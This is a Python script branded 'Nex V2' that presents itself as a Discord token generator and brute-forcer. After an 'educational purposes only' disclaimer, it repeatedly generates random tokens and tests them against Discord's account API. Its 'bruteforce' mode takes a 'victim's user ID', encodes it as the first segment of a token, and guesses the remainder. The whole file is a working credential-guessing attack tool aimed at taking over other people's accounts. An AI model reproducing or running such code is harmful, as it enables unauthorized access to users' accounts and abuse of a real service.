import concurrent.futures
import random
import string
import time
import requests
import base64
import os 
import sys

os.system("color 5")

def intro():
    print("\033[1;31m")  # Set color to red
    print("""
█▄░█▒██▀░▀▄▀░▀▄▀░░░▀█▀░▄▀▄░█▄▀▒██▀░█▄░█░▄▀▀
█▒▀█░█▄▄░█▒█░█▒█▒░░▒█▒░▀▄▀░█▒█░█▄▄░█▒▀█▒▄██
""")
    print("\033[0m")  # Reset color
    time.sleep(2)
    print("\033[1;33m")  # Set color to yellow
    print("THIS IS USED FOR EDUCATIONAL PURPOSES ONLY.")
    print("WE ARE NOT RESPONSIBLE FOR HOW YOU USE THIS.")
    print("NEXX V2 IS NOT RESPONSIBLE FOR HOW USE IT")
    time.sleep(2)
    print("\033[0m")  # Reset color
    print("Nex V2 Is Entering your pc", end='')
    for _ in range(3):
        print(".", end='', flush=True)
        time.sleep(1)
    print(" :)")

intro()


def generate_discord_token(length=59):
    characters = string.ascii_letters + string.digits + "-"
    return ''.join(random.choice(characters) for _ in range(length))

def check_token_validity(token):
    headers = {
        "Authorization": token
    }
    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    if response.status_code == 200:
        return True
    else:
        return False

def generate_tokens(duration):
    start_time = time.time()
    if duration == '0':
        duration_seconds = 0
    elif duration.endswith('m'):
        duration_seconds = int(duration[:-1]) * 60
    elif duration.endswith('h'):
        duration_seconds = int(duration[:-1]) * 3600
    elif duration.endswith('d'):
        duration_seconds = int(duration[:-1]) * 86400
    else:
        duration_seconds = float(duration)
    while True:
        token = generate_discord_token()
        validity = check_token_validity(token)
        if validity:
            print(f"{token} | Valid |")
            break
        else:
            print(f"{token} | Invalid |")
        if duration_seconds != 0 and time.time() - start_time >= duration_seconds:
            print("Time limit reached.")
            break

def test_token(token):
    validity = check_token_validity(token)
    if validity:
        print("Token is valid.")
    else:
        print("Token is invalid.")

def encode_id(id):
    encoded_id = base64.b64encode(str(id).encode()).decode()
    return encoded_id

def brute_force_tokens(duration):
    start_time = time.time()
    if duration == '0':
        duration_seconds = 0
    elif duration.endswith('m'):
        duration_seconds = int(duration[:-1]) * 60
    elif duration.endswith('h'):
        duration_seconds = int(duration[:-1]) * 3600
    elif duration.endswith('d'):
        duration_seconds = int(duration[:-1]) * 86400
    else:
        duration_seconds = float(duration)
    while True:
        user_id = input("Enter the victim's user ID: ")
        encoded_id = encode_id(user_id)
        token_part1 = encoded_id
        while True:
            token_part2 = generate_discord_token(length=32)
            token = f"{token_part1}.{token_part2}"
            validity = check_token_validity(token)
            if validity:
                print(f"{token} | Valid |")
                break
            else:
                print(f"{token} | Invalid |")
            if duration_seconds != 0 and time.time() - start_time >= duration_seconds:
                print("Time limit reached.")
                break

def animate_input_prompt(prompt, delay=0.05):
    for char in prompt:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

if __name__ == "__main__":
    animate_input_prompt("Enter 'generate' to generate tokens, 'bruteforce' for token brute force, or 'test' to test a token: ")
    mode = input()
    if mode.lower() == 'generate':
        animate_input_prompt("Enter duration in seconds (enter '0' to run until valid token is found): ")
        duration = input()
        generate_tokens(duration)
    elif mode.lower() == 'bruteforce':
        animate_input_prompt("Enter duration in seconds (enter '0' to run until valid token is found): ")
        duration = input()
        brute_force_tokens(duration)
    elif mode.lower() == 'test':
        animate_input_prompt("Enter token to test: ")
        token = input()
        test_token(token)
    else:
        animate_input_prompt("Invalid mode specified.")
